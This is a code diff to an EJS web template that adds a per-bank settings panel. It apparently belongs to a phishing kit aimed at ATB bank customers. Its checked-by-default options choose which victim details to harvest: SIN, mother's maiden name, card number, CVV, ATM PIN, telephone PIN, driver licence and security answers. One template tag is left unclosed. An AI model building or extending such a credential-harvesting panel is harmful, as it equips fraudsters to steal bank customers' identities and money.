@@ -120,7 +120,114 @@
                                 </div>
                             </div>
 
+                           
                             <div class="row">
+                                <% if(data != null){ %>
+                                    <% for(bank in settings) { %>
+                                        <div class="col-md-4">
+                                            <div class="card">
+                                                <div class="card-header">
+                                                    <%= bank.toUpperCase() %>
+                                                </div>
+                                                <div class="card-body">
+                                                    <% for(setting in settings[bank]){ %>
+                                                        <div> Setting <%= setting %> </div>
+                                                        <div> Settings[bank][setting] <%= settings[bank][setting] </div>
+                                                        <% } %>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <% } %>
+
+                                    <div class="col-md-4">
+                                        <div class="card">
+                                            <div class="card-header">
+                                            
+                                                ATB
+                                            </div>
+                                            <div class="card-body">
+    
+                                                <!-- ATB Form -->
+    
+                                                <div class="mb-3 form-check">
+                                                    <label class="form-check-label" for="atbQ/A">Q/A</label>
+                                                    <select class="form-select" name="settings[atb][qa]" id="atbQ/A">
+                                                        <option selected>0</option>
+                                                        <option>1</option>
+                                                        <option>2</option>
+                                                        <option>3</option>
+                                                        <option>4</option>
+                                                        <option>5</option>
+                                                    </select>
+                                                </div>
+                                                
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][name]" class="form-check-input" id="atbFullName">
+                                                    <label class="form-check-label" for="atbFullName">Full Name</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][address]" class="form-check-input" id="atbFullName">
+                                                    <label class="form-check-label" for="atbFullName">Full Address</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][postal]" class="form-check-input" id="atbPostalCode">
+                                                    <label class="form-check-label" for="atbPostalCode">Postal Code</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][pin]" class="form-check-input" id="atbDigit">
+                                                    <label class="form-check-label" for="atbDigit">3-Digit Tele Pin</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][phone]" class="form-check-input" id="atbPhoneNumber">
+                                                    <label class="form-check-label" for="atbPhoneNumber">Phone Number</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][email]" class="form-check-input" id="atbEmail">
+                                                    <label class="form-check-label" for="atbEmail">Email</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][dob]" class="form-check-input" id="atbDOB">
+                                                    <label class="form-check-label" for="atbDOB">Date Of Birth</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][mmn]" class="form-check-input" id="atbMMN">
+                                                    <label class="form-check-label" for="atbMMN">Mother's Maiden Name</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][sin]" class="form-check-input" id="atbSIN">
+                                                    <label class="form-check-label" for="atbSIN">Social Insurance Number</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][dl]" class="form-check-input" id="atbDL">
+                                                    <label class="form-check-label" for="atbDL">Driver Licence</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][card]" class="form-check-input" id="atbCN">
+                                                    <label class="form-check-label" for="atbCN">Card Number</label>
+                                                </div>
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][exp]" class="form-check-input" id="atbEXP">
+                                                    <label class="form-check-label" for="atbEXP">Expiration Date</label>
+                                                </div>
+                                                
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][cvv]" class="form-check-input" id="atbCVV">
+                                                    <label class="form-check-label" for="atbCVV">CVV</label>
+                                                </div>
+                                                
+                                                <div class="mb-3 form-check">
+                                                    <input checked  type="checkbox" name="settings[atb][atm]" class="form-check-input" id="atbATM">
+                                                    <label class="form-check-label" for="atbATM">ATM Pin</label>
+                                                </div>
+                                                <!-- Add other form fields here -->
+                                                
+    
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <% } else { %>
                                 <!-- ATB Bank Section -->
                                 <div class="col-md-4">
                                     <div class="card">
@@ -1417,6 +1524,7 @@
                                         </div>
                                     </div>
                                 </div>
+                                <% } %>
                                 
                             </div>
                             <div class="row">
